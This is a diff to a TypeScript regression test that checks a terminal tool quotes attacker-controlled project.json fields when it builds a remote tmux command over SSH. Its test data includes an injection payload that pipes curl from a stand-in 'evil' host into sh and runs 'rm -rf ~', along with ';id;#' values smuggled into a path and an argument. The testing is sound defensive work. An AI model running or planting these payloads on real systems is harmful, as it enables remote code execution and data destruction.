@@ -78,8 +78,26 @@ function shellParse(cmd: string): { argv: string[]; unquotedMeta: string[] } {
 
 const conn = { host: 'h.example.com', user: 'deploy', port: 2222, identityFile: '/k/id' }
 
-/** Every shell escape an attacker gets from a project.json node id, in one string. */
-const PAYLOAD = "n1;curl${IFS}http://evil/x|sh;#`id`$(id)&&rm -rf ~\nwhoami\r'quote'\"dq\""
+/**
+ * Every shell escape an attacker gets from a project.json node id, in one string.
+ *
+ * `$'`, `` $` ``, `$&` and `$$` are here for a SECOND reason and must not be dropped: they are
+ * `String.prototype.replace` REPLACEMENT PATTERNS. The first version of this fix quoted correctly
+ * and then passed the quoted string as `replace`'s string argument, where `$'` expands to the text
+ * FOLLOWING the match — splicing `-s '<session>' -c '<cwd>' …` inside the token and inverting its
+ * quote parity. Quoting is not enough on its own; how the quoted bytes are spliced matters too.
+ */
+const PAYLOAD =
+  "n1;curl${IFS}http://evil/x|sh;#`id`$(id)&&rm -rf ~\nwhoami\r'quote'\"dq\"$'$`$&$$"
+
+/**
+ * Values that land AFTER the `-e` pairs in the built line — the region a replacement-pattern
+ * escape would drag inside the quotes. They are hostile ON PURPOSE and must stay that way: pinning
+ * them benign is exactly what let the `$'` defect pass a green suite. All three come from the same
+ * `.nodeterm/project.json` as the node id.
+ */
+const HOSTILE_CWD = '/srv/app;id;#'
+const HOSTILE_PROGRAM_ARGS = ['--resume', 'sess;id;#']
 
 describe('remoteTmuxPtyArgs: an attacker-controlled node id is DATA, never command structure', () => {
   it('the parser itself sees structure in an UNQUOTED payload (guards the assertion)', () => {
@@ -94,9 +112,9 @@ describe('remoteTmuxPtyArgs: an attacker-controlled node id is DATA, never comma
       conn,
       '/s.sock',
       'nt-n1',
-      '/home/u',
-      undefined,
-      undefined,
+      HOSTILE_CWD,
+      'claude',
+      HOSTILE_PROGRAM_ARGS,
       remoteHookEnvArgs('/home/u/.nodeterm/hook-endpoint-p1.env', PAYLOAD, '1', 'claude'),
       '/home/u/.nodeterm/tmux.conf'
     )
@@ -106,11 +124,33 @@ describe('remoteTmuxPtyArgs: an attacker-controlled node id is DATA, never comma
     expect(unquotedMeta).toEqual([])
     // (b) the payload is ONE argument, verbatim — tmux gets it as an env value, sh never sees it.
     expect(argv).toContain(`NODETERM_NODE_ID=${PAYLOAD}`)
+    // (c) the region AFTER the splice is intact too: a replacement-pattern escape (`$'`) would
+    // have dragged these inside the quotes and turned their `;` into command structure.
+    expect(argv).toContain(HOSTILE_CWD)
+    expect(argv).toContain('sess;id;#')
     // and the command is still exactly one tmux invocation with the expected shape.
     expect(argv.slice(0, 3)).toEqual(['tmux', '-L', 'nodeterm-rmt'])
     expect(argv.filter((a) => a === 'new-session')).toHaveLength(1)
     expect(argv).toContain('nt-n1')
-    expect(argv).toContain('/home/u')
+  })
+
+  it("an agent id carrying a $' replacement pattern cannot invert the rest of the line", () => {
+    // The exact reviewer PoC shape: the NODE ID is legitimate, the escape rides another
+    // project.json field (`node.data.agentId`) into the same splice.
+    const args = remoteTmuxPtyArgs(
+      conn,
+      '/s.sock',
+      'nt-term-mabc-3',
+      HOSTILE_CWD,
+      undefined,
+      undefined,
+      remoteHookEnvArgs('/home/u/.nodeterm/hook-endpoint-p1.env', 'term-mabc-3', '1', "claude$'"),
+      '/home/u/.nodeterm/tmux.conf'
+    )
+    const { argv, unquotedMeta } = shellParse(args[args.length - 1])
+    expect(unquotedMeta).toEqual([])
+    expect(argv).toContain("NODETERM_AGENT_ID=claude$'")
+    expect(argv).toContain(HOSTILE_CWD)
   })
 
   it('quotes the managed-account CLAUDE_CONFIG_DIR pair too (same splice, same file provenance)', () => {
